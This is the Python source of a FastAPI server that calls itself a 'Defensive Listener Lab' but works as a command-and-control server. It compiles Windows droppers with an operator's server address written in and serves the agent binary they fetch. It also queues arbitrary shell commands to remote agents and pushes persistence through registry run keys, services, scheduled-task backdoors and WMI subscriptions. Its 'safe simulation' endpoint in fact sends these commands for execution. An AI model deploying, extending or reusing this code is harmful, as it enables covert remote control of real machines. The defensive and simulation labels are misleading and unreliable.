import os
import sys
import re
import asyncio
import shutil
import subprocess
import tempfile
import uuid
from urllib.parse import urlparse
from collections import deque
from threading import Lock
from typing import Any
from contextlib import asynccontextmanager
from datetime import datetime, timezone

import logging
import uvicorn
from fastapi import FastAPI, HTTPException, Request
from fastapi.middleware.cors import CORSMiddleware
from fastapi.middleware.trustedhost import TrustedHostMiddleware
from fastapi.responses import FileResponse, RedirectResponse, Response
from fastapi.staticfiles import StaticFiles

sys.path.insert(0, os.path.dirname(__file__))

from modules import audit_db, listener_manager
from routes import agents_safe as agents, auth_safe as auth, listeners_safe as listeners


logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)


BASE_DIR = os.path.dirname(os.path.dirname(__file__))
WEB_STATIC_DIR = os.path.join(BASE_DIR, "web", "static")
BINARIES_DIR = os.path.join(BASE_DIR, "binaries")
LEGACY_BINARIES_DIR = os.path.join(os.path.dirname(__file__), "binaries")
MODELS_ALLOWED_METHODS = {"add", "remove", "check", "list"}
MODELS_ALLOWED_TECHNIQUES = {"reg", "service", "schtask", "schtaskbackdoor", "startupfolder", "phantom", "wmisubscription"}
MODELS_ALLOWED_REG_KEYS = {"hkcurun", "hkcurunonce", "hklmrun", "hklmrunonce", "logonscript", "userinit", "stickynotes"}
MODELS_ALLOWED_FREQUENCIES = {"hourly", "daily", "logon"}
MODELS_ALLOWED_PHANTOM_MODES = {"restart", "shutdown", "logoff", "all"}
MODELS_ALLOWED_WMI_TRIGGERS = {"interval", "logon", "startup", "process"}
SHELL_HISTORY_LIMIT = 200
_shell_lock = Lock()
_shell_sessions: dict[tuple[str, str], dict[str, Any]] = {}

# Configuration pour le compilateur - Chemin absolu vers GCC
GCC_PATH = r"C:\msys64\mingw64\bin\gcc.exe"
DROPPER_COMPILERS = [
    GCC_PATH,
    "x86_64-w64-mingw32-gcc",
    "gcc",
    "clang"
]
if os.name == "nt":
    DROPPER_COMPILERS = [GCC_PATH, "gcc", "clang", "x86_64-w64-mingw32-gcc"]


def _utc_now_iso() -> str:
    return datetime.now(timezone.utc).isoformat()


def _binary_search_dirs() -> list[str]:
    dirs: list[str] = []
    seen: set[str] = set()
    for candidate in (BINARIES_DIR, LEGACY_BINARIES_DIR):
        normalized = os.path.normcase(os.path.abspath(candidate))
        if normalized in seen:
            continue
        seen.add(normalized)
        dirs.append(candidate)
    return dirs


def _resolve_binary_path(filename: str) -> str | None:
    for directory in _binary_search_dirs():
        path = os.path.join(directory, filename)
        if os.path.isfile(path):
            return path
    return None


def _compiler_path() -> str | None:
    # Vérifier d'abord le chemin absolu
    if os.path.exists(GCC_PATH):
        return GCC_PATH
    
    # Sinon chercher dans le PATH
    for compiler in DROPPER_COMPILERS:
        resolved = shutil.which(compiler)
        if resolved:
            return resolved
    return None


def _compiler_env(compiler_path: str) -> dict[str, str]:
    """
    Build a subprocess environment that can execute MinGW/MSYS2 GCC reliably
    even when the server process was started without the compiler directory in PATH.
    """
    env = os.environ.copy()
    compiler_dir = os.path.dirname(os.path.abspath(compiler_path))
    current_path = env.get("PATH", "")

    if not compiler_dir:
        return env

    normalized_compiler_dir = os.path.normcase(os.path.abspath(compiler_dir))
    path_entries = [
        entry for entry in current_path.split(os.pathsep)
        if entry
    ]
    normalized_entries = {
        os.path.normcase(os.path.abspath(entry))
        for entry in path_entries
    }

    if normalized_compiler_dir not in normalized_entries:
        env["PATH"] = os.pathsep.join([compiler_dir, *path_entries])

    return env


def _escape_wide_c_string(value: str) -> str:
    return value.replace("\\", "\\\\").replace('"', '\\"')


def _download_response(content: bytes | str, filename: str, media_type: str, **headers: str) -> Response:
    return Response(
        content=content,
        media_type=media_type,
        headers={
            "Content-Disposition": f'attachment; filename="{filename}"',
            **headers,
        },
    )


def _dropper_source_response(source_code: str, safe_filename: str, reason: str) -> Response:
    return _download_response(
        source_code,
        f"dropper_{safe_filename}.c",
        "text/plain; charset=utf-8",
        **{
            "X-Dropper-Output-Type": "source",
            "X-Dropper-Reason": reason,
        },
    )


def _models_quote(value: str) -> str:
    escaped = value.replace('"', '\\"')
    return f'"{escaped}"'


def _models_require(fields: dict[str, Any], errors: list[str], key: str, message: str) -> str:
    value = str(fields.get(key, "")).strip()
    if not value:
        errors.append(message)
    return value


def _models_build_command(
    technique: str,
    method: str,
    fields: dict[str, Any],
    errors: list[str],
    server_url: str = "",
    listener_id: str = "",
    agent_id: str = "",
    command_arg: str = "",  # 🔥 NOUVEAU PARAMÈTRE
) -> str:
    # Use the in-process bridge command name handled by MyAgent InteractiveShellClient.
    # "persist -flags..." is translated internally to Persist.ExecuteFromArgs(...).
    parts: list[str] = ["persist", "-t", technique, "-m", method]

    if technique == "reg":
        reg_key = str(fields.get("key", "")).strip().lower()
        if reg_key not in MODELS_ALLOWED_REG_KEYS:
            errors.append("Registry key must be one of: hkcurun, hkcurunonce, hklmrun, hklmrunonce, logonscript, userinit, stickynotes.")
        else:
            parts.extend(["-k", reg_key])

        value_name = str(fields.get("value_name", "")).strip()
        if value_name:
            parts.extend(["-v", value_name])

        if method in {"add", "check"}:
            if not server_url:
                errors.append("server_url is required for reg add/check shell persistence.")
            else:
                parts.extend(["-s", server_url])
            if not listener_id:
                errors.append("listener_id is required for reg add/check shell persistence.")
            else:
                parts.extend(["-l", listener_id])
            if agent_id:
                parts.extend(["-i", agent_id])

        if bool(fields.get("obfuscation_env", False)):
            parts.extend(["-o", "env"])

    elif technique == "service":
        service_name = _models_require(fields, errors, "service_name", "Service Name is required for service technique.")
        if service_name:
            parts.extend(["-n", service_name])

        if method in {"add", "check"}:
            if not server_url:
                errors.append("server_url is required for service add/check shell persistence.")
            else:
                parts.extend(["-s", server_url])
            if not listener_id:
                errors.append("listener_id is required for service add/check shell persistence.")
            else:
                parts.extend(["-l", listener_id])
            if agent_id:
                parts.extend(["-i", agent_id])

    elif technique == "schtask":
        task_name = _models_require(fields, errors, "task_name", "Task Name is required for schtask technique.")
        if task_name:
            parts.extend(["-n", task_name])

        if method in {"add", "check"}:
            if not server_url:
                errors.append("server_url is required for schtask add/check shell persistence.")
            else:
                parts.extend(["-s", server_url])
            if not listener_id:
                errors.append("listener_id is required for schtask add/check shell persistence.")
            else:
                parts.extend(["-l", listener_id])
            if agent_id:
                parts.extend(["-i", agent_id])

        frequency = str(fields.get("frequency", "")).strip().lower()
        if frequency:
            if frequency not in MODELS_ALLOWED_FREQUENCIES:
                errors.append("Frequency must be hourly, daily, logon, or empty.")
            else:
                parts.extend(["-o", frequency])

    elif technique == "schtaskbackdoor":
        task_name = _models_require(fields, errors, "task_name", "Existing Task Name is required for schtaskbackdoor.")
        if task_name:
            parts.extend(["-n", task_name])

        if method in {"add", "check"}:
            if not server_url:
                errors.append("server_url is required for schtaskbackdoor add/check shell persistence.")
            else:
                parts.extend(["-s", server_url])
            if not listener_id:
                errors.append("listener_id is required for schtaskbackdoor add/check shell persistence.")
            else:
                parts.extend(["-l", listener_id])
            if agent_id:
                parts.extend(["-i", agent_id])

    elif technique == "startupfolder":
        file_name = _models_require(fields, errors, "file_name", "File Name is required for startupfolder technique.")
        if file_name:
            parts.extend(["-f", file_name])

        if method in {"add", "check"}:
            if not server_url:
                errors.append("server_url is required for startupfolder add/check shell persistence.")
            else:
                parts.extend(["-s", server_url])
            if not listener_id:
                errors.append("listener_id is required for startupfolder add/check shell persistence.")
            else:
                parts.extend(["-l", listener_id])
            if agent_id:
                parts.extend(["-i", agent_id])

    elif technique == "phantom":
        scenario_name = _models_require(fields, errors, "scenario_name", "Scenario Name is required for phantom technique.")
        if scenario_name:
            parts.extend(["-n", scenario_name])

        if method in {"add", "check"}:
            if not server_url:
                errors.append("server_url is required for phantom add/check shell persistence.")
            else:
                parts.extend(["-s", server_url])
            if not listener_id:
                errors.append("listener_id is required for phantom add/check shell persistence.")
            else:
                parts.extend(["-l", listener_id])
            if agent_id:
                parts.extend(["-i", agent_id])

        trigger_mode = str(fields.get("trigger_mode", "")).strip().lower()
        if trigger_mode:
            if trigger_mode not in MODELS_ALLOWED_PHANTOM_MODES:
                errors.append("trigger_mode must be restart, shutdown, logoff, or all.")
            else:
                parts.extend(["-o", trigger_mode])

    elif technique == "wmisubscription":
        subscription_name = _models_require(fields, errors, "subscription_name", "Subscription Name is required for wmisubscription technique.")
        if subscription_name:
            parts.extend(["-n", subscription_name])

        if method in {"add", "check"}:
            if not server_url:
                errors.append("server_url is required for wmisubscription add/check shell persistence.")
            else:
                parts.extend(["-s", server_url])
            if not listener_id:
                errors.append("listener_id is required for wmisubscription add/check shell persistence.")
            else:
                parts.extend(["-l", listener_id])
            if agent_id:
                parts.extend(["-i", agent_id])

        trigger_mode = str(fields.get("trigger_mode", "")).strip().lower()
        if trigger_mode:
            if trigger_mode not in MODELS_ALLOWED_WMI_TRIGGERS:
                errors.append("trigger_mode must be interval, logon, startup, or process.")
            else:
                parts.extend(["-o", trigger_mode])
        
        # 🔥 AJOUTER command_arg SI PRÉSENT (pour interval et process)
        if command_arg:
            parts.extend(["-a", command_arg])

    quoted_parts = [_models_quote(str(part)) if (" " in str(part) or "\\" in str(part)) else str(part) for part in parts]
    return " ".join(quoted_parts)

def _models_listener_server_url(listener_id: str, fallback_url: str) -> str:
    if not listener_id:
        return fallback_url

    listener = listener_manager.get_listener(listener_id)
    if not listener:
        return fallback_url

    protocol = "http"
    host = str(listener.get("host") or "").strip()
    port = listener.get("port")
    if not host:
        return ""

    normalized_host = host.lower()
    if normalized_host in {"127.0.0.1", "localhost", "::1"}:
        # Loopback listener host is not suitable for remote VM persistence.
        return ""

    if not port:
        return f"http://{host}"

    try:
        port_number = int(port)
    except (TypeError, ValueError):
        return f"http://{host}"

    default_port = 80
    if port_number == default_port:
        return f"http://{host}"

    return f"http://{host}:{port_number}"


def _models_is_loopback_url(value: str) -> bool:
    if not value:
        return True
    try:
        parsed = urlparse(value)
    except Exception:
        return True
    host = (parsed.hostname or "").strip().lower()
    return host in {"127.0.0.1", "localhost", "::1"}


def _models_force_http_url(value: str) -> str:
    if not value:
        return value
    try:
        parsed = urlparse(value)
    except Exception:
        return value
    host = parsed.netloc or parsed.path
    if not host:
        return value
    return f"http://{host}"


async def _models_wait_for_shell_result(listener_id: str, agent_id: str, command_id: str, timeout_seconds: int = 60) -> dict[str, Any] | None:
    deadline = datetime.now(timezone.utc).timestamp() + max(timeout_seconds, 5)
    while datetime.now(timezone.utc).timestamp() < deadline:
        session = _shell_session(listener_id, agent_id, create=False)
        if session is not None:
            with _shell_lock:
                history = list(session["history"])
            for entry in reversed(history):
                if entry.get("command_id") == command_id and entry.get("status") == "completed":
                    return entry
        await asyncio.sleep(1.0)
    return None


def _shell_session(listener_id: str, agent_id: str, create: bool) -> dict[str, Any] | None:
    key = (listener_id, agent_id)
    with _shell_lock:
        session = _shell_sessions.get(key)
        if session is None and create:
            session = {
                "listener_id": listener_id,
                "agent_id": agent_id,
                "created_at": _utc_now_iso(),
                "last_seen": _utc_now_iso(),
                "pending": deque(),
                "history": deque(maxlen=SHELL_HISTORY_LIMIT),
            }
            _shell_sessions[key] = session
        if session is not None:
            session["last_seen"] = _utc_now_iso()
        return session


def _sync_shell_agent_presence(listener_id: str, agent_id: str, event_type: str) -> None:
    """
    Mirror shell activity into listener_manager so the Simulated Agents table
    gets fresh last_seen/status updates while shell-only mode is running.
    """
    try:
        listener = listener_manager.get_listener(listener_id)
        if not listener:
            return

        known_agent = None
        for candidate in listener_manager.list_simulated_agents():
            if candidate.get("listener_id") == listener_id and candidate.get("agent_id") == agent_id:
                known_agent = candidate
                break

        system = (known_agent or {}).get("system_info") or {}
        listener_host = str(listener.get("host") or "127.0.0.1")
        listener_name = str(listener.get("name") or listener_id)
        listener_port = int(listener.get("port") or 0)
        default_interval = int(listener.get("beacon_interval") or 5)
        listener_profile = str(listener.get("profile") or "default")

        listener_manager.record_heartbeat(
            listener_id,
            {
                "agent_id": agent_id,
                "hostname": (known_agent or {}).get("hostname") or system.get("hostname") or listener_name,
                "username": (known_agent or {}).get("username") or system.get("username") or "shell-user",
                "process_id": (known_agent or {}).get("process_id") or system.get("pid") or 0,
                "operating_system": (known_agent or {}).get("operating_system") or system.get("os") or "Windows",
                "status": "alive",
                "event_type": event_type,
                "signal": "interactive_shell",
                "sleep_interval": default_interval,
                "jitter": 0.0,
                "ip_address": (known_agent or {}).get("ip_address") or system.get("ip_address") or listener_host,
                "user_agent": "MyAgent/Shell",
                "uri": "/api/listeners/shell/poll",
                "system_info": {
                    "hostname": system.get("hostname") or (known_agent or {}).get("hostname") or listener_name,
                    "username": system.get("username") or (known_agent or {}).get("username") or "shell-user",
                    "os": system.get("os") or (known_agent or {}).get("operating_system") or "Windows",
                    "domain": system.get("domain") or (known_agent or {}).get("hostname_domain") or "WORKGROUP",
                    "listener_id": listener_id,
                    "listener_port": listener_port,
                    "listener_profile": listener_profile,
                },
                "metadata": {
                    "source": "shell-runtime",
                    "listener_id": listener_id,
                    "agent_id": agent_id,
                    "event_type": event_type,
                },
            },
        )
    except Exception as exc:
        logger.warning(
            "Unable to sync shell presence for listener=%s agent=%s: %s",
            listener_id,
            agent_id,
            exc,
        )


@asynccontextmanager
async def lifespan(_: FastAPI):
    logger.info("Defensive Listener Lab started")
    logger.info("Documentation available at: http://127.0.0.1:8000/api/docs")
    # Créer le dossier binaries s'il n'existe pas
    os.makedirs(BINARIES_DIR, exist_ok=True)
    
    # Vérifier que le compilateur est disponible
    compiler = _compiler_path()
    if compiler:
        logger.info("Compiler found: %s", compiler)
    else:
        logger.warning("No compiler found! Dropper generation will fallback to C source.")
    
    yield
    logger.info("Defensive Listener Lab stopped")


app = FastAPI(
    title="Defensive Listener Lab",
    description="Listener simulation and monitoring (localhost by default; LAN via LAB_BIND_HOST)",
    version="1.0.0",
    docs_url="/api/docs",
    redoc_url="/api/redoc",
    lifespan=lifespan,
)


def _lab_bind_host() -> str:
    return (os.environ.get("LAB_BIND_HOST") or "127.0.0.1").strip() or "127.0.0.1"


def _lab_listens_on_all_interfaces(host: str) -> bool:
    return host in ("0.0.0.0", "::", "[::]")


_bind_host = _lab_bind_host()
_listen_lan = _lab_listens_on_all_interfaces(_bind_host)

# Configuration CORS simplifiée - PAS d'authentification
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

# Pas de TrustedHostMiddleware pour éviter les blocages
app.include_router(auth.router)
app.include_router(agents.router)
app.include_router(listeners.router)

if os.path.isdir(WEB_STATIC_DIR):
    app.mount("/static", StaticFiles(directory=WEB_STATIC_DIR), name="static")



# ============================================================
# AUTHENTIFICATION MIDDLEWARE
# ============================================================

OPERATOR_SESSION_COOKIE = "lab_session"

def _is_operator_authenticated(request: Request) -> bool:
    """Vérifie si l'opérateur est authentifié via cookie"""
    token = request.cookies.get(OPERATOR_SESSION_COOKIE) or ""
    if not token:
        # Vérifier aussi dans l'en-tête Authorization
        auth_header = request.headers.get("Authorization", "")
        if auth_header.startswith("Bearer "):
            token = auth_header[7:]
    
    
    if not token:
        return False
    try:
        payload = auth.jwt_manager.verify_token(token)
        return payload is not None
    except Exception as e:
        print(f"[DEBUG] Erreur validation: {e}")
        return False

def _is_protected_api_path(path: str) -> bool:
    """Détermine si une route API nécessite authentification"""
    if not path.startswith("/api/"):
        return False
    if path.startswith("/api/auth/"):
        return False
    if path in ("/api/status", "/api/health", "/api/docs", "/api/redoc", "/api/openapi.json"):
        return False
    
    # Routes agents (à protéger)
    if re.match(r"^/api/agents/", path):
        return True
    
    # Routes listeners (à protéger)
    if re.match(r"^/api/listeners/", path):
        # Exceptions pour les agents (heartbeat, audit, poll)
        if re.match(r"^/api/listeners/[^/]+/heartbeat$", path):
            return False
        if re.match(r"^/api/listeners/[^/]+/audit-reports$", path):
            return False
        if re.match(r"^/api/listeners/[^/]+/agents/[^/]+/shell/(poll|result)$", path):
            return False
        return True
    
    return True


@app.middleware("http")
async def auth_middleware(request: Request, call_next):
    path = request.url.path
    
    # Pages publiques
    if path == "/login" or path.startswith("/static/"):
        return await call_next(request)
    
    # Route racine
    if path == "/":
        if not _is_operator_authenticated(request):
            return RedirectResponse(url="/login", status_code=302)
        return await call_next(request)
    
    # Routes API protégées
    if _is_protected_api_path(path):
        # 🔍 LOG POUR DEBUG
        auth_header = request.headers.get("Authorization", "")
        
        if not _is_operator_authenticated(request):
            return Response(
                content='{"detail":"Not authenticated"}',
                media_type="application/json",
                status_code=401
            )
        return await call_next(request)
    
    return await call_next(request)

@app.get("/login", tags=["ui"])
async def login_page():
    """Page de connexion"""
    login_path = os.path.join(WEB_STATIC_DIR, "login.html")
    if os.path.isfile(login_path):
        return FileResponse(login_path)
    return Response(content="Login page not found", status_code=404)
   
# ═══════════════════════════════════════════════════════════════════════════
#  ENDPOINTS POUR LE DROPPER
# ═══════════════════════════════════════════════════════════════════════════

@app.get("/binaries/scanner.exe", tags=["dropper"])
async def download_scanner():
    """
    Télécharge l'exécutable scanner.exe (MyAgent) depuis le serveur C2.
    Le dropper appelle cette route pour récupérer le binaire.
    """
    file_path = _resolve_binary_path("scanner.exe")
    if not file_path:
        raise HTTPException(status_code=404, detail="Scanner binary not found. Please place scanner.exe in the 'binaries' folder.")
    return FileResponse(
        file_path,
        media_type="application/octet-stream",
        filename="scanner.exe"
    )


@app.get("/api/dropper/listener", tags=["dropper"])
async def dropper_listener():
    """
    Endpoint simple que le dropper appelle pour vérifier la connexion.
    Retourne 'OK' et l'URL où télécharger le scanner.
    """
    return {
        "status": "OK",
        "action": "download_scanner",
        "scanner_url": "/binaries/scanner.exe"
    }


@app.post("/api/dropper/generate", tags=["dropper"])
async def generate_dropper(request: dict):
    """
    Génère un dropper personnalisé avec l'IP et le listener ID fournis.
    
    Body JSON attendu:
    {
        "server_ip": "192.168.1.3",
        "listener_id": "listener_5faf1a006b59",
        "payload_name": "MyPayload"
    }
    """
    server_ip = request.get("server_ip", "").strip()
    listener_id = request.get("listener_id", "").strip()
    payload_name = request.get("payload_name", "dropper").strip()
    
    if not server_ip:
        raise HTTPException(status_code=400, detail="server_ip is required")
    if not listener_id:
        raise HTTPException(status_code=400, detail="listener_id is required")
    
    # Nettoyer le payload_name pour le nom de fichier
    safe_filename = re.sub(r'[^a-zA-Z0-9_-]', '_', payload_name)
    
    # Chemin du template
    template_path = _resolve_binary_path("dropper_template.c")
    if not template_path:
        raise HTTPException(
            status_code=404, 
            detail="Dropper template not found. Please place dropper_template.c in the 'binaries' folder."
        )
    
    # Lire le template
    with open(template_path, "r", encoding="utf-8") as f:
        template_code = f.read()
    
    # Remplacer les valeurs
    modified_code = re.sub(
        r'#define C2_SERVER L"[^"]*"', 
        f'#define C2_SERVER L"{_escape_wide_c_string(server_ip)}"', 
        template_code
    )
    modified_code = re.sub(
        r'#define LISTENER_ID L"[^"]*"', 
        f'#define LISTENER_ID L"{_escape_wide_c_string(listener_id)}"', 
        modified_code
    )
    
    # Créer un fichier source temporaire
    temp_fd, temp_c_path = tempfile.mkstemp(suffix=".c", text=True)
    with os.fdopen(temp_fd, "w", encoding="utf-8") as f:
        f.write(modified_code)
    
    # Créer un chemin pour l'exécutable temporaire
    temp_exe_fd, temp_exe_path = tempfile.mkstemp(suffix=".exe")
    os.close(temp_exe_fd)

    compiler_path = _compiler_path()
    if not compiler_path:
        logger.warning("No supported dropper compiler found; returning generated C source instead.")
        if os.path.exists(temp_c_path):
            os.unlink(temp_c_path)
        if os.path.exists(temp_exe_path):
            os.unlink(temp_exe_path)
        return _dropper_source_response(modified_code, safe_filename, "compiler_unavailable")
    
    try:
        # Compiler le dropper
        compile_cmd = [
            compiler_path,
            "-Os", "-s", "-static", "-mwindows",
            temp_c_path,
            "-o", temp_exe_path,
            "-lwinhttp"
        ]
        
        logger.info(f"Compiling dropper with: {' '.join(compile_cmd)}")
        
        result = subprocess.run(
            compile_cmd, 
            capture_output=True, 
            text=True,
            env=_compiler_env(compiler_path),
            timeout=60
        )
        
        if result.returncode != 0:
            logger.error(f"Compilation failed: {result.stderr}")
            if os.path.exists(temp_c_path):
                os.unlink(temp_c_path)
            if os.path.exists(temp_exe_path):
                os.unlink(temp_exe_path)
            return _dropper_source_response(modified_code, safe_filename, "compilation_failed")
        
        # Lire le fichier compilé
        with open(temp_exe_path, "rb") as f:
            exe_content = f.read()
        
        # Nettoyer les fichiers temporaires
        os.unlink(temp_c_path)
        os.unlink(temp_exe_path)
        
        # Retourner le fichier
        return _download_response(
            exe_content,
            f"dropper_{safe_filename}.exe",
            "application/octet-stream",
            **{"X-Dropper-Output-Type": "exe"},
        )
        
    except subprocess.TimeoutExpired:
        # Nettoyer
        if os.path.exists(temp_c_path):
            os.unlink(temp_c_path)
        if os.path.exists(temp_exe_path):
            os.unlink(temp_exe_path)
        logger.error("Dropper compilation timed out; returning generated C source instead.")
        return _dropper_source_response(modified_code, safe_filename, "compilation_timeout")
        
    except Exception as e:
        # Nettoyer
        if os.path.exists(temp_c_path):
            os.unlink(temp_c_path)
        if os.path.exists(temp_exe_path):
            os.unlink(temp_exe_path)
        raise HTTPException(status_code=500, detail=str(e))


@app.post("/api/models/simulate", tags=["models"])
async def simulate_models(request: dict, http_request: Request):
    """
    Safe simulation endpoint for persistence models.
    Validates input and returns the theoretical command without executing it.
    """
    technique = str(request.get("technique", "")).strip().lower()
    fields = request.get("fields", {})
    server_url = str(request.get("server_url", "")).strip()
    listener_id = str(request.get("listener_id", "")).strip()
    agent_id = str(request.get("agent_id", "")).strip()
    if not isinstance(fields, dict):
        raise HTTPException(status_code=400, detail="fields must be an object.")
    
    # 🔥 RÉCUPÉRER command_arg DEPUIS fields (si présent)
    command_arg = fields.get("command_arg", "")
    method = str(fields.get("method", "")).strip().lower()

    validation_errors: list[str] = []
    if technique not in MODELS_ALLOWED_TECHNIQUES:
        validation_errors.append("Technique must be one of: reg, service, schtask, schtaskbackdoor, startupfolder, phantom, wmisubscription.")
    if method not in MODELS_ALLOWED_METHODS:
        validation_errors.append("Method must be one of: add, remove, check, list.")

    command = ""
    if not validation_errors:
        listener_server_url = _models_listener_server_url(listener_id, "")
        request_server_url = _models_force_http_url((server_url or str(http_request.base_url).rstrip("/")).strip())
        effective_server_url = listener_server_url or request_server_url
        if _models_is_loopback_url(effective_server_url):
            validation_errors.append(
                "A non-local server URL is required for VM persistence (localhost/127.0.0.1 are not allowed). "
                "Configure listener host with your server IP."
            )
        command = _models_build_command(
            technique,
            method,
            fields,
            validation_errors,
            effective_server_url,
            listener_id,
            agent_id,
            command_arg,  # 🔥 PASSER command_arg À LA FONCTION
        )

    command_id = None
    execution_result: dict[str, Any] | None = None
    executed_on_agent = False
    should_queue = True
    if not validation_errors and command and should_queue:
        if not listener_id:
            validation_errors.append("listener_id is required to execute the persistence model.")
        if not agent_id:
            validation_errors.append("agent_id is required to execute the persistence model.")
        if not validation_errors:
            session = _shell_session(listener_id, agent_id, create=True)
            if session is None:
                validation_errors.append("failed to initialize shell session.")
            else:
                command_id = f"cmd_{uuid.uuid4().hex[:12]}"
                record = {
                    "command_id": command_id,
                    "command": command,
                    "queued_at": _utc_now_iso(),
                }
                with _shell_lock:
                    session["pending"].append(record)
                    session["history"].append({**record, "status": "queued"})

                execution_result = await _models_wait_for_shell_result(listener_id, agent_id, command_id, timeout_seconds=60)
                executed_on_agent = execution_result is not None

    return {
        "status": "ok" if not validation_errors else "validation_error",
        "simulation_mode": False,
        "technique": technique,
        "method": method,
        "listener_id": listener_id,
        "agent_id": agent_id,
        "input_fields": fields,
        "validation_errors": validation_errors,
        "theoretical_command": command,
        "queued_command_id": command_id,
        "executed_on_agent": executed_on_agent,
        "agent_result": execution_result,
        "would_execute": bool(command) and should_queue and not validation_errors,
        "note": "Persistence command queued to selected MyAgent interactive shell."
    }

# ═══════════════════════════════════════════════════════════════════════════


@app.post("/api/listeners/{listener_id}/agents/{agent_id}/shell/command", tags=["shell"])
async def shell_queue_command(listener_id: str, agent_id: str, request: dict):
    command = str(request.get("command", "")).strip()
    if not command:
        raise HTTPException(status_code=400, detail="command is required")

    session = _shell_session(listener_id, agent_id, create=True)
    if session is None:
        raise HTTPException(status_code=500, detail="failed to initialize shell session")

    command_id = f"cmd_{uuid.uuid4().hex[:12]}"
    record = {
        "command_id": command_id,
        "command": command,
        "queued_at": _utc_now_iso(),
    }
    with _shell_lock:
        session["pending"].append(record)
        session["history"].append({**record, "status": "queued"})

    return {
        "status": "queued",
        "listener_id": listener_id,
        "agent_id": agent_id,
        "command_id": command_id,
        "command": command,
    }


@app.post("/api/listeners/{listener_id}/agents/{agent_id}/shell/poll", tags=["shell"])
async def shell_poll(listener_id: str, agent_id: str, _: dict | None = None):
    session = _shell_session(listener_id, agent_id, create=True)
    if session is None:
        return {"command_id": None, "command": None}
    _sync_shell_agent_presence(listener_id, agent_id, "shell_poll")

    with _shell_lock:
        pending = session["pending"]
        if pending:
            record = pending.popleft()
            return {
                "command_id": record.get("command_id"),
                "command": record.get("command"),
            }

    return {"command_id": None, "command": None}


@app.post("/api/listeners/{listener_id}/agents/{agent_id}/shell/result", tags=["shell"])
async def shell_submit_result(listener_id: str, agent_id: str, request: dict):
    command_id = str(request.get("command_id", "")).strip()
    if not command_id:
        raise HTTPException(status_code=400, detail="command_id is required")

    session = _shell_session(listener_id, agent_id, create=True)
    if session is None:
        raise HTTPException(status_code=500, detail="failed to initialize shell session")
    _sync_shell_agent_presence(listener_id, agent_id, "shell_result")

    result = {
        "command_id": command_id,
        "command": str(request.get("command", "")).strip(),
        "stdout": str(request.get("stdout", "")),
        "stderr": str(request.get("stderr", "")),
        "exit_code": int(request.get("exit_code", 0)),
        "timed_out": bool(request.get("timed_out", False)),
        "completed_at": str(request.get("completed_at", "")).strip() or _utc_now_iso(),
        "status": "completed",
    }

    with _shell_lock:
        session["history"].append(result)

    return {"status": "stored", "command_id": command_id}


@app.get("/api/listeners/{listener_id}/agents/{agent_id}/shell/history", tags=["shell"])
async def shell_history(listener_id: str, agent_id: str, limit: int = 30):
    safe_limit = max(1, min(limit, SHELL_HISTORY_LIMIT))
    session = _shell_session(listener_id, agent_id, create=False)
    if session is None:
        return {
            "listener_id": listener_id,
            "agent_id": agent_id,
            "history": [],
        }

    with _shell_lock:
        history = list(session["history"])

    return {
        "listener_id": listener_id,
        "agent_id": agent_id,
        "created_at": session.get("created_at"),
        "last_seen": session.get("last_seen"),
        "history": history[-safe_limit:],
    }


# ═══════════════════════════════════════════════════════════════════════════


@app.get("/", tags=["ui"])
async def root():
    """Dashboard UI."""
    dashboard_path = os.path.join(WEB_STATIC_DIR, "dashboard.html")
    if os.path.isfile(dashboard_path):
        return FileResponse(dashboard_path)
    return {
        "status": "online",
        "service": "Defensive Listener Lab",
        "version": "1.0.0",
        "timestamp": _utc_now_iso(),
        "note": "dashboard.html not found",
    }


@app.get("/api/status", tags=["status"])
async def api_status():
    """Basic status endpoint."""
    return {
        "status": "online",
        "service": "Defensive Listener Lab",
        "version": "1.0.0",
        "timestamp": _utc_now_iso(),
        "mode": "defensive-simulation",
    }





@app.get("/api/health", tags=["status"])
async def health_check():
    """Detailed health check for the local lab."""
    agents_list = listener_manager.list_simulated_agents()
    summary = listener_manager.get_summary()
    total_audit_reports = audit_db.count_audit_reports()
    return {
        "status": "healthy",
        "mode": "defensive-simulation",
        "timestamp": _utc_now_iso(),
        "agents": {
            "total": len(agents_list),
            "alive": len([a for a in agents_list if a.get("status") == "alive"]),
            "dead": len([a for a in agents_list if a.get("status") == "dead"]),
        },
        "listeners": summary,
        "storage": {
            "mode": "hybrid",
            "note": "listeners and simulated agents are kept in memory; audit reports are persisted in SQLite",
            "audit_reports": {
                "mode": "sqlite",
                "total": total_audit_reports,
            },
        },
    }


if __name__ == "__main__":
    host = _lab_bind_host()
    port = 8000

    if len(sys.argv) > 1:
        port = int(sys.argv[1])

    if _lab_listens_on_all_interfaces(host):
        logger.info(
            "LAB_BIND_HOST=%s: API reachable on LAN (firewall permitting). "
            "Use http://<this-machine-ip>:%s in MyAgent --server.",
            host,
            port,
        )
    logger.info("Starting Defensive Listener Lab on %s:%s", host, port)
    uvicorn.run(
        "main:app",
        host=host,
        port=port,
        reload=False,
        log_level="info",
    )
